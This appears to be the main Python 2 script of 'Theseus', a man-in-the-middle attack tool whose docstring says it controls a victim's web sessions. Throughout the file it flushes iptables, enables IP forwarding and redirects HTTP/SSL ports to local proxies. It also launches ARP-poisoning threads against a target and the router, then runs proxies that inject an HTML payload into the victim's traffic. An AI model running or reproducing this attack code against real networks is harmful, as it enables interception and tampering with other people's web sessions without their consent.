import os
import socket
import argparse
import threading
import ConfigParser
import multiprocessing
from arp.arp import Arp_Spoof
from proxy.proxy import HTTP_Proxy, SSL_Proxy

class Theseus(object):
	"""Theseus Control A Victims Web Sessions"""
	def __init__(self):
		global args, arp, http_proxy, ssl_proxy, local, router, verbose, html_file, cfg
		super(Theseus, self).__init__()
		cfg = ConfigParser.RawConfigParser()
		cfile = 'theseus.cfg'
		cfg.read(cfile)
		ip_forward = cfg.get('IPTables-Settings', 'path_to_ip_forward')
		rhttp = cfg.get('IPTables-Settings', 'Receive_HTTP_Port')
		rssl = cfg.get('IPTables-Settings', 'Receive_SSL_Port')
		bhttp = cfg.get('Proxy-Settings', 'Bind_HTTP_Port')
		bssl = cfg.get('Proxy-Settings', 'Bind_SSL_Port')
		#Configure kernal and iptables for the attack
		os.popen("{ echo 1 > "+ip_forward+";\
					iptables --flush;\
					iptables --flush -t nat;\
					iptables -t nat -A PREROUTING -p tcp --destination-port "+rhttp+" -j REDIRECT --to-port "+bhttp+";\
					iptables -t nat -A PREROUTING -p tcp --destination-port "+rssl+" -j REDIRECT --to-port "+bssl+"; }")

		ap = argparse.ArgumentParser(description="Theseus")
		ap.add_argument("-t", "--target", help="This is the targets ip address", required=True)
		ap.add_argument("-i", "--interface", help="This is the network cards current interface", required=True)
		args = ap.parse_args()

		# Load Setting From Config file
		router = cfg.get('Arp-Spoof-Settings', 'routers_ip_address')
		local = cfg.get('Theseus-Settings', 'local_ip_address')
		verbose = cfg.get('Arp-Spoof-Settings', 'verbose')
		html_file = cfg.get('Proxy-Settings', 'Html_Payload_Path')

		#Handle any possable errors from args
		try:
			int(verbose)
		except ValueError:
			print("\033[1;31mTime must be whole number\033[00m")
			exit()
		try:
			socket.inet_aton(args.target)
			socket.inet_aton(router)
		except socket.error:
			print("\033[1;31mIncorrect IP address\033[00m")
			exit()
		try:
			with open(html_file, 'r') as file:
				file.read()
		except:
			print("\033[1;31mError Opening file\033[00m")
			exit()

	def attack(self):
		if bool(cfg.get('Arp-Spoof-Settings', 'Running')) == True:
			arp = Arp_Spoof(args.interface)

			victim_thread = threading.Thread(target=arp.poison_victim, args=(args.target, router, int(verbose), args.interface))
			victim_thread.deamon = True
			victim_thread.start()

			target_thread = threading.Thread(target=arp.poison_router, args=(router, args.target, int(verbose), args.interface))
			target_thread.deamon = True
			target_thread.start()

		if bool(cfg.get('Proxy-Settings', 'Running')) == True:
			http_proxy = HTTP_Proxy(local, 9000, html_file)
			ssl_proxy = SSL_Proxy(local, 4444, html_file)

			jobs = []
			for i in range(4):
		   		p = multiprocessing.Process(target=http_proxy._http_client_handler)
		   		jobs.append(p)
		   		p.start()
		   		p2 = multiprocessing.Process(target=ssl_proxy._ssl_client_handler())
		   		jobs.append(p2)
		   		p2.start()


if __name__ == '__main__':
	print("\033[1;3mTheseus v1\033[00m")
	t = Theseus()
	try:
		t.attack()
	except KeyboardInterrupt:
		exit()
